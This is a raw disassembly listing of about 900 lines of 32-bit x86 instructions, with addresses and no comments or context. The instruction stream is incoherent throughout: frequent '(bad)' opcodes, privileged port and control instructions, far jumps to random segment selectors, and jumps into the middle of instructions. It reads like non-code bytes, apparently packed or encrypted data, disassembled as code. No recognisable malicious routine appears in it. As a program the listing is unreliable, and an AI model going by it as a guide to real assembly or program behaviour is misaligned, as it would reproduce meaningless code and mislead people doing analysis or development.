  41f9ab:	fs jno 0x41f942
  41f9ae:	in     al,0x7e
  41f9b0:	scas   eax,DWORD PTR es:[edi]
  41f9b1:	(bad)  
  41f9b2:	fst    DWORD PTR ds:0x1e0a7594
  41f9b8:	cmp    dh,BYTE PTR [eax-0x9]
  41f9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9bd:	mov    eax,0xc9b0431b
  41f9c2:	sbb    eax,0xb4d43189
  41f9c7:	sbb    eax,0x54c2f283
  41f9cc:	rcl    ebp,cl
  41f9ce:	jb     0x41fa2f
  41f9d0:	mov    ?,WORD PTR [eax]
  41f9d2:	in     al,0xc4
  41f9d4:	xchg   BYTE PTR [edi+0x557ab2a7],bh
  41f9da:	clts   
  41f9dc:	and    BYTE PTR [eax+0x60],bl
  41f9df:	xor    DWORD PTR [esi+0x3e5d5b91],0x67b297c4
  41f9e9:	mov    ?,WORD PTR [eax]
  41f9eb:	xchg   esp,eax
  41f9ec:	mov    edi,0xd308a253
  41f9f1:	sub    dl,dl
  41f9f3:	ret    0xec9c
  41f9f6:	xchg   ecx,eax
  41f9f7:	test   al,0x75
  41f9f9:	and    DWORD PTR [edi],esp
  41f9fb:	jns    0x41f9c3
  41f9fd:	mov    dh,bl
  41f9ff:	jge    0x41fa30
  41fa01:	imul   ebx,ebp,0x68
  41fa04:	enter  0xf087,0xa2
  41fa08:	in     eax,dx
  41fa09:	push   edx
  41fa0a:	push   ecx
  41fa0b:	and    DWORD PTR [ebp+eiz*4+0x7f96eb4f],edx
  41fa12:	push   eax
  41fa13:	mov    edx,0x5e7c0de4
  41fa18:	out    dx,eax
  41fa19:	lods   eax,DWORD PTR ds:[esi]
  41fa1a:	ret    0xab9f
  41fa1d:	into   
  41fa1e:	dec    ebp
  41fa1f:	mov    cl,0x4d
  41fa21:	push   es
  41fa22:	jo     0x41fa1a
  41fa24:	push   0x2a
  41fa26:	ss jmp 0xe041:0x939d988a
  41fa2e:	adc    esi,edx
  41fa30:	setp   BYTE PTR ds:0xc49eaef1
  41fa37:	xchg   ebx,eax
  41fa38:	sub    BYTE PTR [eax-0x500a4e0c],cl
  41fa3e:	pop    ds
  41fa3f:	jecxz  0x41fa02
  41fa41:	repnz aad 0xb7
  41fa44:	xlat   BYTE PTR ds:[ebx]
  41fa45:	outs   dx,DWORD PTR ds:[esi]
  41fa46:	add    esi,edx
  41fa48:	sub    eax,0x74e065ec
  41fa4d:	sub    al,BYTE PTR [edi+0x25ad18ba]
  41fa53:	pusha  
  41fa54:	sahf   
  41fa55:	test   eax,0x3f0d7123
  41fa5a:	lds    edx,FWORD PTR [edi-0x4f]
  41fa5d:	dec    cl
  41fa5f:	jle    0x41faa0
  41fa61:	imul   esi,DWORD PTR [esi+ecx*1+0xf4e6c78],0x3ac858d7
  41fa6c:	push   esi
  41fa6d:	outs   dx,DWORD PTR ds:[esi]
  41fa6f:	xchg   ebp,eax
  41fa70:	(bad)  
  41fa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa72:	pop    esi
  41fa73:	(bad)  
  41fa74:	lock jnp 0x41fa01
  41fa77:	pusha  
  41fa78:	xor    al,0x77
  41fa7a:	xor    BYTE PTR [esi+0x1c],0x9a
  41fa7e:	pop    ebp
  41fa7f:	add    cl,cl
  41fa81:	xchg   ebp,eax
  41fa82:	jle    0x41fa32
  41fa84:	fsubr  QWORD PTR [ecx]
  41fa86:	fcomp  DWORD PTR [ecx+0x12]
  41fa89:	div    cl
  41fa8b:	pavgw  mm7,QWORD PTR [edx-0x6]
  41fa8f:	sub    bl,bh
  41fa91:	sub    eax,0x2042986c
  41fa96:	mov    bh,0xd8
  41fa98:	bound  edx,QWORD PTR [ecx+0x1a]
  41fa9b:	jge    0x41fb18
  41fa9d:	mov    cl,0x8
  41fa9f:	outs   dx,DWORD PTR ds:[esi]
  41faa0:	push   ebx
  41faa1:	cmp    DWORD PTR ds:0xde0765e0,ebx
  41faa7:	mov    eax,ds:0x22965ff2
  41faac:	cmp    ch,BYTE PTR [ecx+0x6cac6248]
  41fab2:	int    0x33
  41fab4:	mov    WORD PTR [ebp-0x57],?
  41fab7:	adc    esi,DWORD PTR [ebx-0x44]
  41faba:	push   dx
  41fabc:	and    BYTE PTR [edi+esi*1-0x12ce266c],0x1f
  41fac4:	sub    BYTE PTR [edx-0x7],ch
  41fac7:	jge    0x41fad6
  41fac9:	push   0xffffffe6
  41facb:	push   ss
  41facc:	out    dx,al
  41facd:	inc    ebx
  41face:	push   edx
  41facf:	js     0x41fa81
  41fad1:	into   
  41fad2:	mov    eax,ds:0x2778e0a9
  41fad7:	xchg   esi,eax
  41fad8:	adc    eax,0x21f9f134
  41fadd:	push   ebx
  41fade:	push   edx
  41fadf:	xchg   ebp,eax
  41fae0:	adc    DWORD PTR [ebx],0x4c
  41fae3:	push   edi
  41fae4:	mov    dl,dl
  41fae6:	rcr    BYTE PTR [esi],cl
  41fae8:	icebp  
  41fae9:	jge    0x41fa78
  41faeb:	mov    bh,0xa1
  41faed:	in     al,0x45
  41faef:	push   es
  41faf0:	pushf  
  41faf1:	push   0x33
  41faf3:	jmp    0xb02c:0x12c0b38b
  41fafa:	adc    ebp,eax
  41fafc:	sub    BYTE PTR [ebx],0x1
  41faff:	fiadd  DWORD PTR [ebx]
  41fb01:	call   0x8891:0xe1b1b73b
  41fb08:	ins    BYTE PTR es:[edi],dx
  41fb09:	loop   0x41fac5
  41fb0b:	sbb    bh,ch
  41fb0d:	or     BYTE PTR [ebx],dh
  41fb0f:	cwde   
  41fb10:	cmp    ebx,DWORD PTR [eax-0x33]
  41fb13:	xchg   ebp,eax
  41fb14:	lods   eax,DWORD PTR ds:[esi]
  41fb15:	push   edi
  41fb16:	jnp    0x41fb27
  41fb18:	adc    eax,0xf964b434
  41fb1d:	adc    al,0xbd
  41fb1f:	cmc    
  41fb20:	cmp    esi,DWORD PTR [eax]
  41fb22:	imul   esp,DWORD PTR [ebx],0x31
  41fb25:	imul   ebp,DWORD PTR [ecx+esi*4],0xffffff83
  41fb29:	pop    ecx
  41fb2a:	xor    edx,DWORD PTR [eax+edi*4]
  41fb2d:	mov    ds:0x2a521f30,al
  41fb32:	xor    cl,BYTE PTR [esi-0xc]
  41fb35:	cmp    ch,bh
  41fb37:	stos   BYTE PTR es:[edi],al
  41fb38:	call   0x95fd:0xb1506b8d
  41fb3f:	push   esi
  41fb40:	adc    eax,0x56b7ff11
  41fb45:	xchg   edx,eax
  41fb46:	push   0x6f6fb691
  41fb4b:	cmp    cl,BYTE PTR ds:0x9bb540f1
  41fb51:	imul   esp,DWORD PTR [ebx-0x6],0x7f
  41fb55:	and    bh,ch
  41fb57:	fild   DWORD PTR [ecx]
  41fb59:	std    
  41fb5a:	js     0x41fb16
  41fb5c:	push   esi
  41fb5d:	mov    ecx,0xd039b5db
  41fb62:	sub    ch,BYTE PTR [edi]
  41fb64:	adc    eax,0x7028d7a0
  41fb69:	retf   
  41fb6a:	cli    
  41fb6b:	scas   eax,DWORD PTR es:[edi]
  41fb6c:	adc    DWORD PTR [ebx-0x55],0xccad058c
  41fb73:	xchg   ecx,eax
  41fb74:	mov    bl,0x1e
  41fb76:	inc    eax
  41fb77:	cmp    ch,BYTE PTR [ebx]
  41fb79:	(bad)  
  41fb7b:	xchg   ecx,eax
  41fb7c:	dec    edx
  41fb7d:	es clc 
  41fb7f:	sbb    edx,DWORD PTR [esi-0x2dd60c71]
  41fb85:	pop    ebx
  41fb86:	fisttp WORD PTR [edx]
  41fb88:	sti    
  41fb89:	addr16 mov ecx,0x5125a25b
  41fb8f:	jbe    0x41fb71
  41fb91:	(bad)  
  41fb92:	into   
  41fb93:	es mov edi,0x7711cd7d
  41fb99:	cld    
  41fb9a:	pop    ebx
  41fb9b:	lods   eax,DWORD PTR ds:[esi]
  41fb9c:	out    dx,eax
  41fb9d:	dec    esp
  41fb9e:	pop    ebp
  41fb9f:	adc    ecx,eax
  41fba1:	pop    esp
  41fba2:	xlat   BYTE PTR ds:[ebx]
  41fba3:	push   cs
  41fba4:	xchg   ecx,eax
  41fba5:	adc    DWORD PTR [edx+eiz*2+0x1a80242d],ecx
  41fbac:	lahf   
  41fbad:	or     bl,BYTE PTR [ebp+ebx*4-0x1d8727ca]
  41fbb4:	test   dh,0x5e
  41fbb7:	sbb    edx,DWORD PTR [eax+ebp*2]
  41fbba:	retf   0xa373
  41fbbd:	cmp    BYTE PTR [eax],bh
  41fbbf:	js     0x41fb7f
  41fbc1:	or     edi,esp
  41fbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbc4:	jbe    0x41fc2a
  41fbc6:	fsubr  DWORD PTR [esp+ebx*8]
  41fbc9:	pop    edi
  41fbca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbcb:	out    0x8e,eax
  41fbcd:	xchg   ebp,ecx
  41fbcf:	sbb    eax,0x6437580a
  41fbd4:	and    esp,esp
  41fbd6:	sti    
  41fbd7:	xor    al,0x50
  41fbd9:	mov    esi,?
  41fbdb:	les    ecx,FWORD PTR [ebx+0x53]
  41fbde:	das    
  41fbdf:	xchg   esi,eax
  41fbe0:	sbb    cl,cl
  41fbe2:	adc    ch,BYTE PTR [ecx-0x58]
  41fbe5:	arpl   WORD PTR [edx+0x5a],dx
  41fbe8:	mov    ds:0xfa110074,eax
  41fbed:	jo     0x41fc29
  41fbef:	scas   al,BYTE PTR es:[edi]
  41fbf0:	pushf  
  41fbf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf2:	pushf  
  41fbf3:	mov    ds:0x58c90791,eax
  41fbf8:	pop    ebp
  41fbf9:	add    DWORD PTR [ecx+0x79],eax
  41fbfc:	mov    ds:0x77c97aa1,al
  41fc01:	stos   DWORD PTR es:[edi],eax
  41fc02:	dec    ebp
  41fc03:	jne    0x41fc71
  41fc05:	add    al,BYTE PTR [ecx-0x4d]
  41fc08:	mov    edx,DWORD PTR [esi]
  41fc0a:	push   ss
  41fc0b:	sar    DWORD PTR [esp+eiz*8],cl
  41fc0e:	popf   
  41fc0f:	inc    ecx
  41fc10:	popf   
  41fc11:	shl    BYTE PTR [ecx],0xec
  41fc14:	cmc    
  41fc15:	mov    eax,ds:0x8052a44b
  41fc1a:	(bad)  
  41fc1c:	cs pop edi
  41fc1e:	aaa    
  41fc1f:	jnp    0x41fbb0
  41fc21:	test   DWORD PTR [esi+0x25e02026],0xe2c57e2e
  41fc2b:	rol    DWORD PTR [bx+si+0x56b6],1
  41fc30:	adc    ecx,ebp
  41fc32:	das    
  41fc33:	icebp  
  41fc34:	jb     0x41fc05
  41fc36:	or     esp,DWORD PTR [ebx+ebx*2+0x4d]
  41fc3a:	(bad)  
  41fc3b:	mov    ecx,0xca7f1dd3
  41fc40:	adc    al,bl
  41fc42:	inc    eax
  41fc43:	or     BYTE PTR [ecx+0x6c2dbe01],dh
  41fc49:	cmp    BYTE PTR [ebp+eiz*1+0x4813f57a],bh
  41fc50:	mov    bl,0x32
  41fc52:	loope  0x41fca0
  41fc54:	imul   ebp,DWORD PTR [ebx+0x12932123],0xffffffd9
  41fc5b:	inc    ebp
  41fc5c:	mov    ch,0x39
  41fc5e:	mov    edi,0x915d7874
  41fc63:	fwait
  41fc64:	lods   eax,DWORD PTR ds:[esi]
  41fc65:	mov    esi,0x6f668e22
  41fc6a:	pushf  
  41fc6b:	lea    eax,[esi]
  41fc6d:	outs   dx,DWORD PTR ds:[esi]
  41fc6e:	std    
  41fc6f:	mov    ds:0x8ee234c5,al
  41fc74:	scas   eax,DWORD PTR es:[edi]
  41fc75:	sub    al,0x40
  41fc77:	dec    ecx
  41fc78:	mov    fs,WORD PTR [esi+0x3c6f594c]
  41fc7e:	scas   eax,DWORD PTR es:[edi]
  41fc7f:	jecxz  0x41fce7
  41fc81:	mov    dh,0x6f
  41fc83:	mov    ebp,0xc5837b0
  41fc88:	call   0x4f5099a8
  41fc8d:	retf   
  41fc8e:	mov    WORD PTR [edx-0x6a],?
  41fc91:	outs   dx,BYTE PTR ds:[esi]
  41fc92:	fnstsw WORD PTR [eax-0x7063e45d]
  41fc98:	adc    ebp,DWORD PTR [ebx]
  41fc9a:	or     BYTE PTR [eax-0x7b],dl
  41fc9d:	pop    esp
  41fc9e:	loop   0x41fcac
  41fca0:	ins    DWORD PTR es:[edi],dx
  41fca1:	shl    BYTE PTR [eax],0xd1
  41fca4:	dec    eax
  41fca5:	add    esp,DWORD PTR [edi]
  41fca7:	and    edx,0xb3cad920
  41fcad:	pop    es
  41fcae:	adc    al,0xc7
  41fcb0:	or     ebp,DWORD PTR [esi+0x4]
  41fcb3:	xor    eax,0x11a9b457
  41fcb8:	sub    eax,0x4e3717d1
  41fcbd:	fmul   st,st(2)
  41fcbf:	dec    edx
  41fcc0:	fwait
  41fcc1:	arpl   WORD PTR [edi],ax
  41fcc3:	out    dx,eax
  41fcc4:	push   esi
  41fcc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcc6:	(bad)  
  41fcc7:	(bad)  
  41fcc8:	ror    BYTE PTR [ebp+0x54e23d46],0xac
  41fccf:	retf   0x56fa
  41fcd2:	shl    DWORD PTR [ebp+0x14],cl
  41fcd5:	sbb    ebx,DWORD PTR [ecx-0x58d7cff5]
  41fcdb:	shr    DWORD PTR cs:[ecx-0x5219a491],0x6
  41fce3:	ins    BYTE PTR es:[edi],dx
  41fce4:	ins    BYTE PTR es:[edi],dx
  41fce5:	push   eax
  41fce6:	arpl   WORD PTR [eax+0xf403671],dx
  41fcec:	enter  0x361c,0x9
  41fcf0:	xchg   esp,eax
  41fcf1:	sbb    DWORD PTR [edi+0x22fbe252],ecx
  41fcf7:	rcl    DWORD PTR [edi+0x77],0x20
  41fcfb:	push   ebp
  41fcfc:	hlt    
  41fcfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcfe:	outs   dx,BYTE PTR ds:[esi]
  41fcff:	push   eax
  41fd00:	out    dx,al
  41fd01:	(bad)
  41fd06:	mov    bl,ch
  41fd08:	(bad)  
  41fd09:	push   ebx
  41fd0a:	xor    BYTE PTR [edi-0x56],bl
  41fd0d:	xchg   ebp,eax
  41fd0e:	push   cs
  41fd0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd10:	inc    bh
  41fd12:	dec    edi
  41fd13:	or     ecx,ebp
  41fd15:	popf   
  41fd16:	(bad)  
  41fd17:	in     eax,0xf1
  41fd19:	ja     0x41fd9a
  41fd1b:	mov    esp,0x6b41bb89
  41fd20:	(bad)  
  41fd22:	loopne 0x41fd0a
  41fd24:	pop    esi
  41fd25:	scas   eax,DWORD PTR es:[di]
  41fd27:	pop    eax
  41fd28:	sub    bh,BYTE PTR [esp+esi*2-0x74]
  41fd2c:	(bad)  
  41fd2d:	xchg   edx,eax
  41fd2e:	adc    al,BYTE PTR [esi+ebx*4]
  41fd31:	sti    
  41fd32:	push   ebx
  41fd33:	(bad)  
  41fd34:	and    BYTE PTR [edi],dl
  41fd36:	ffree  st(7)
  41fd38:	outs   dx,DWORD PTR ds:[esi]
  41fd39:	(bad)  
  41fd3b:	cdq    
  41fd3c:	sti    
  41fd3d:	add    DWORD PTR [ebp-0x120808aa],ebp
  41fd43:	push   0x8
  41fd45:	add    dl,bl
  41fd47:	dec    edi
  41fd48:	mov    al,ds:0xf5451d8a
  41fd4d:	(bad)  [esi+eiz*1]
  41fd50:	mov    ebx,0xab586b66
  41fd55:	sbb    bh,BYTE PTR [esp+ecx*2+0x5030d58b]
  41fd5c:	push   ebx
  41fd5d:	(bad)  
  41fd5e:	aad    0xde
  41fd60:	sbb    al,0x11
  41fd62:	shl    BYTE PTR [ebx+0x50],0x3d
  41fd66:	cmp    DWORD PTR [ebx-0x1b],ebp
  41fd69:	push   edx
  41fd6a:	or     bh,ah
  41fd6c:	les    ecx,FWORD PTR [edi]
  41fd6e:	repnz pushf 
  41fd70:	icebp  
  41fd71:	mov    bl,0x86
  41fd73:	mov    bl,0x3a
  41fd75:	sbb    DWORD PTR [esi+eax*2+0x44],ebp
  41fd79:	retf   0x9e6b
  41fd7c:	(bad)  
  41fd7d:	out    dx,eax
  41fd7e:	fimul  WORD PTR [esi+0x51]
  41fd81:	sti    
  41fd82:	aas    
  41fd83:	mov    al,0x87
  41fd85:	sbb    bl,dl
  41fd87:	add    esi,DWORD PTR [ebx-0x6a]
  41fd8a:	inc    eax
  41fd8b:	fist   WORD PTR [ecx+0x57]
  41fd8e:	adc    al,0x10
  41fd90:	call   0xaa45c0ff
  41fd95:	fdiv   st(6),st
  41fd97:	mov    ds:0xe81abcea,eax
  41fd9c:	fmul   QWORD PTR [ebx+0x1d]
  41fd9f:	pusha  
  41fda0:	int    0x78
  41fda2:	push   edx
  41fda3:	and    esp,DWORD PTR [edi-0x42]
  41fda6:	jl     0x41fdd7
  41fda8:	(bad)  
  41fda9:	mov    ds:0xc53163c,eax
  41fdae:	mov    ds:0x2b923532,al
  41fdb3:	adc    BYTE PTR [esp+eax*2+0x4ffd7b79],al
  41fdba:	mov    ch,0xf0
  41fdbc:	dec    esp
  41fdbd:	jns    0x41fe22
  41fdbf:	mov    al,0x12
  41fdc1:	add    DWORD PTR [edi],ebx
  41fdc3:	cdq    
  41fdc4:	pop    ecx
  41fdc5:	test   BYTE PTR [edi],dl
  41fdc7:	test   BYTE PTR [esi+0x27f9bc62],al
  41fdcd:	popf   
  41fdce:	aas    
  41fdcf:	push   ebp
  41fdd0:	jmp    0xbf34:0xc7afd913
  41fdd7:	inc    ebp
  41fdd8:	call   FWORD PTR es:[eax+0x3f]
  41fddc:	loopne 0x41fe02
  41fdde:	mov    dh,0xf7
  41fde0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fde1:	adc    BYTE PTR [ebx],al
  41fde3:	sub    dl,BYTE PTR [ebp+esi*1-0x2]
  41fde7:	fwait
  41fde8:	mov    esi,0xe71c0e72
  41fded:	inc    ebp
  41fdee:	stos   DWORD PTR es:[edi],eax
  41fdef:	cmp    DWORD PTR [edi-0x49],0x73
  41fdf3:	mov    esp,0x6c4fd951
  41fdf8:	imul   ebp,DWORD PTR ds:0xf199dfce,0xffffffc4
  41fdff:	jl     0x41fda0
  41fe01:	jb     0x41fe0a
  41fe03:	sbb    edx,ecx
  41fe05:	inc    esp
  41fe06:	mov    ebx,0x57209abe
  41fe0b:	scas   eax,DWORD PTR es:[edi]
  41fe0c:	cmp    al,0x87
  41fe0e:	stc    
  41fe0f:	out    0x22,al
  41fe11:	jp     0x41fdab
  41fe13:	lea    edi,[esi]
  41fe15:	repz jle 0x41fdcd
  41fe18:	je     0x41fdae
  41fe1a:	pop    ebx
  41fe1b:	mov    ds:0xfc38c5ff,al
  41fe20:	sbb    eax,0x883d9c6a
  41fe25:	aam    0xa6
  41fe27:	pop    edx
  41fe28:	mov    edx,DWORD PTR [eax]
  41fe2a:	aaa    
  41fe2b:	pop    ss
  41fe2c:	cmp    al,0x15
  41fe2e:	xchg   esp,eax
  41fe2f:	xor    al,0x86
  41fe31:	test   al,0xca
  41fe33:	repz push es
  41fe35:	das    
  41fe36:	push   esi
  41fe37:	(bad)  
  41fe38:	cmp    al,0x11
  41fe3a:	dec    esp
  41fe3b:	jg     0x41fe5f
  41fe3d:	fld    QWORD PTR [esp+eax*1]
  41fe40:	cmp    BYTE PTR [ecx+0x5a],bh
  41fe43:	mov    al,ds:0xc1c94fd8
  41fe48:	push   edi
  41fe49:	outs   dx,BYTE PTR ds:[esi]
  41fe4a:	lds    esi,FWORD PTR [edi-0x3191f833]
  41fe50:	popf   
  41fe51:	xor    DWORD PTR [edi],esi
  41fe53:	adc    ah,dh
  41fe55:	or     ah,BYTE PTR [edi-0x763c7f10]
  41fe5b:	nop
  41fe5c:	inc    edi
  41fe5d:	adc    eax,0xabe338ed
  41fe62:	fld    TBYTE PTR [ecx+0x0]
  41fe65:	icebp  
  41fe66:	test   dl,cl
  41fe68:	xor    eax,0xec1583db
  41fe6d:	mov    WORD PTR ds:0xfff556b,gs
  41fe73:	into   
  41fe74:	mov    dh,0xc2
  41fe76:	fwait
  41fe77:	add    al,0x53
  41fe79:	push   ds
  41fe7a:	sub    cl,BYTE PTR es:[esi-0x5]
  41fe7e:	push   esp
  41fe7f:	stc    
  41fe80:	in     al,dx
  41fe81:	clc    
  41fe82:	pushf  
  41fe83:	jbe    0x41fe52
  41fe85:	fwait
  41fe86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe87:	push   ds
  41fe88:	xor    bl,BYTE PTR [ecx-0x1c]
  41fe8b:	sar    BYTE PTR [eax-0x756d1a8c],1
  41fe91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe92:	arpl   WORD PTR cs:[ecx],di
  41fe95:	adc    al,0x10
  41fe97:	imul   ecx,DWORD PTR [edx-0x1],0x6497190e
  41fe9e:	jbe    0x41fe55
  41fea0:	cmp    DWORD PTR [esi+0x1f],ebp
  41fea3:	mov    bh,0x7b
  41fea5:	and    BYTE PTR [edx],ch
  41fea7:	retf   
  41fea8:	inc    esi
  41fea9:	sub    al,0x3
  41feab:	out    0xaf,eax
  41fead:	pop    edi
  41feae:	(bad)  
  41feaf:	bound  edx,QWORD PTR [eax-0x1e]
  41feb2:	mov    bl,0xd9
  41feb4:	sbb    eax,0x7574bf4a
  41feb9:	pop    ebp
  41feba:	cld    
  41febb:	add    ebp,DWORD PTR [ebx]
  41febd:	push   cs
  41febe:	mov    al,bh
  41fec0:	mov    bh,0x6c
  41fec2:	push   ebp
  41fec3:	dec    edi
  41fec4:	jo     0x41fedf
  41fec6:	sub    al,0x1e
  41fec8:	aad    0x8a
  41feca:	cld    
  41fecb:	lock sbb ah,BYTE PTR [edi-0x5abcb6d2]
  41fed2:	out    0x1d,al
  41fed4:	lods   eax,DWORD PTR ds:[esi]
  41fed5:	(bad)  
  41fed6:	sbb    esp,ebx
  41fed8:	call   0x75dac64
  41fedd:	fcmove st,st(3)
  41fedf:	push   ebx
  41fee0:	jnp    0x41fe8f
  41fee2:	out    dx,eax
  41fee3:	outs   dx,BYTE PTR ds:[esi]
  41fee4:	jae    0x41ff5a
  41fee6:	and    al,0xf2
  41fee8:	inc    ebp
  41fee9:	les    ebp,FWORD PTR [esi+0x52]
  41feec:	jmp    0x30f3:0xc642c098
  41fef3:	inc    BYTE PTR [edi+edi*1-0x2ee785b3]
  41fefa:	fwait
  41fefb:	push   ecx
  41fefc:	out    0x9a,al
  41fefe:	imul   esi,edx,0x30de3503
  41ff04:	inc    edi
  41ff05:	call   0x89bb:0xff407163
  41ff0c:	sbb    al,0x88
  41ff0e:	ja     0x41ff81
  41ff10:	jns    0x41ff19
  41ff12:	rcl    DWORD PTR [esi],cl
  41ff14:	call   0x84cc:0x81f83ac0
  41ff1b:	test   DWORD PTR [ecx+edx*4],eax
  41ff1e:	sub    BYTE PTR [esi-0x58cc4dda],0x77
  41ff25:	push   ebx
  41ff26:	sub    al,0x3a
  41ff28:	(bad)  
  41ff2a:	sub    eax,eax
  41ff2c:	jp     0x41ff8c
  41ff2e:	imul   edx,DWORD PTR [ebp-0x367f6dfb],0x902fb7bb
  41ff38:	jg     0x41ff56
  41ff3a:	pop    ds
  41ff3b:	aad    0x8f
  41ff3d:	jmp    0x41ff35
  41ff3f:	pop    ebp
  41ff40:	mov    eax,ds:0xbfe4fa68
  41ff45:	fistp  WORD PTR [edx-0x6fd8e379]
  41ff4b:	sbb    eax,DWORD PTR [edi]
  41ff4d:	fdivr  DWORD PTR [edx+0x11]
  41ff50:	in     al,0x98
  41ff52:	xchg   edx,eax
  41ff53:	shr    BYTE PTR [ecx-0x2bc00d3f],1
  41ff59:	shl    edx,cl
  41ff5b:	jo     0x41ff10
  41ff5d:	and    al,0xba
  41ff5f:	xchg   ebp,eax
  41ff60:	daa    
  41ff61:	outs   dx,DWORD PTR ds:[esi]
  41ff62:	xchg   ecx,eax
  41ff63:	stos   DWORD PTR es:[edi],eax
  41ff64:	data16 into 
  41ff66:	call   DWORD PTR [esp+edx*8+0x256f0854]
  41ff6d:	(bad)  
  41ff6e:	cdq    
  41ff6f:	cmp    BYTE PTR [edx],ah
  41ff71:	int    0x2a
  41ff73:	stos   DWORD PTR es:[edi],eax
  41ff74:	jne    0x41ff2b
  41ff76:	outs   dx,BYTE PTR ds:[esi]
  41ff77:	push   edi
  41ff78:	mov    cl,0x8d
  41ff7a:	xchg   ebp,eax
  41ff7b:	mov    esp,0xf8da7565
  41ff80:	add    al,0x84
  41ff82:	push   edx
  41ff83:	mov    ds,WORD PTR [ecx+0x60]
  41ff86:	dec    eax
  41ff87:	sbb    esp,DWORD PTR [ebp+ebp*8-0x6a]
  41ff8b:	pop    es
  41ff8c:	add    dh,BYTE PTR [ebx]
  41ff8e:	out    0xd0,al
  41ff90:	test   BYTE PTR [eax],bl
  41ff92:	imul   edx,edx,0xffffffcb
  41ff95:	fst    DWORD PTR [ebx]
  41ff97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff98:	fwait
  41ff99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff9a:	adc    ecx,0xf855d5c1
  41ffa0:	sub    dl,bl
  41ffa2:	mov    edi,0x75f6ddf8
  41ffa7:	dec    ebp
  41ffa8:	test   BYTE PTR [edi+0x7f],cl
  41ffab:	loope  0x41ffbd
  41ffad:	stc    
  41ffae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffaf:	mov    bl,dh
  41ffb1:	mov    ds:0x76f24680,eax
  41ffb6:	cmp    al,0xb0
  41ffb8:	push   eax
  41ffb9:	cs and eax,0x3fd99654
  41ffbf:	in     eax,dx
  41ffc0:	xchg   ecx,eax
  41ffc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc2:	ret    0xbc62
  41ffc5:	arpl   WORD PTR [ebp+0x1b706866],sp
  41ffcb:	jl     0x41ff73
  41ffcd:	jl     0x41ffd8
  41ffcf:	or     bl,cl
  41ffd1:	call   0x23e6dd83
  41ffd6:	stc    
  41ffd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd8:	jg     0x41ff83
  41ffda:	dec    edi
  41ffdb:	loope  0x41ff5d
  41ffdd:	retf   
  41ffde:	push   0xffffffe8
  41ffe0:	(bad)  [edx+edi*1]
  41ffe3:	bound  edi,QWORD PTR ds:0x13d3a4a
  41ffe9:	or     eax,0x3781a373
  41ffee:	jno    0x41ffb3
  41fff0:	xor    al,0xa
  41fff2:	imul   esi,DWORD PTR [ecx+0x1d],0xefcc4d1b
  41fff9:	mov    al,dh
  41fffb:	pop    ecx
  41fffc:	pop    ebx
  41fffd:	popf   
  41fffe:	cli    
  41ffff:	push   esi
  420000:	stos   BYTE PTR es:[edi],al
  420001:	into   
  420002:	jne    0x420024
  420004:	retf   
  420005:	popa   
  420006:	test   eax,0x6d628685
  42000b:	mov    ebx,0xe8947dfd
  420010:	mov    ds:0x991a23bc,al
  420015:	in     al,dx
  420016:	push   esi
  420017:	ret    
  420018:	jb     0x42006b
  42001a:	push   ecx
  42001b:	cmp    al,0xa4
  42001d:	fs inc esp
  42001f:	fsub   QWORD PTR [edi-0x27da3f8f]
  420025:	fadd   DWORD PTR [ebp+0x4a9f159b]
  42002b:	dec    ecx
  42002c:	and    eax,0x26476d
  420031:	(bad)  
  420032:	and    ah,al
  420034:	push   edx
  420035:	or     cl,BYTE PTR [edi+0x15bc10bf]
  42003b:	jle    0x420030
  42003d:	jb     0x42003a
  42003f:	pop    ds
  420040:	cwde   
  420041:	pop    esp
  420042:	inc    edi
  420043:	and    DWORD PTR [edi-0x225e44ef],ebp
  420049:	fs cs (bad) 
  42004c:	sub    eax,0x81f0cb74
  420051:	sub    DWORD PTR [edi],0x294c9ea1
  420057:	add    dl,ch
  420059:	mov    DWORD PTR [eax],edx
  42005b:	sbb    bl,cl
  42005d:	inc    ebx
  42005e:	add    al,BYTE PTR [eax-0x55]
  420061:	ins    DWORD PTR es:[edi],dx
  420062:	out    0xcf,al
  420064:	lds    ecx,FWORD PTR [ecx+esi*8+0x1]
  420068:	mov    eax,ds:0xd789b8a5
  42006d:	sub    BYTE PTR [ebp+0xd1ff05a],0x44
  420074:	cdq    
  420075:	mov    esp,0xa88f1b95
  42007a:	shr    DWORD PTR [esi+eiz*1+0x5725cd63],cl
  420081:	test   eax,0xd23f160f
  420086:	outs   dx,DWORD PTR ds:[esi]
  420087:	mov    fs,WORD PTR [esi+0xa]
  42008a:	jae    0x42002c
  42008c:	inc    esi
  42008d:	xlat   BYTE PTR ds:[ebx]
  42008e:	clc    
  42008f:	(bad)  
  420091:	xchg   esi,eax
  420092:	xchg   esi,eax
  420093:	add    al,BYTE PTR [edi]
  420095:	inc    edi
  420096:	dec    esi
  420097:	xor    edx,0xffffffbc
  42009a:	mov    esi,0xf4fdf44b
  42009f:	mov    ch,0xdd
  4200a1:	leave  
  4200a2:	jl     0x42009c
  4200a4:	cmp    eax,DWORD PTR [ebx]
  4200a6:	cmp    BYTE PTR [ebx],0x82
  4200a9:	lods   eax,DWORD PTR ds:[esi]
  4200aa:	lea    edx,[esp+esi*2-0x7a7fd5f9]
  4200b1:	pop    ebp
  4200b2:	and    BYTE PTR [eax-0x4f2d9b22],0x96
  4200b9:	leave  
  4200ba:	sbb    al,0x9c
  4200bc:	je     0x420059
  4200be:	ret    0x41a7
  4200c1:	out    dx,eax
  4200c2:	add    ah,dh
  4200c4:	mov    dh,0xc1
  4200c6:	pop    ebx
  4200c7:	leave  
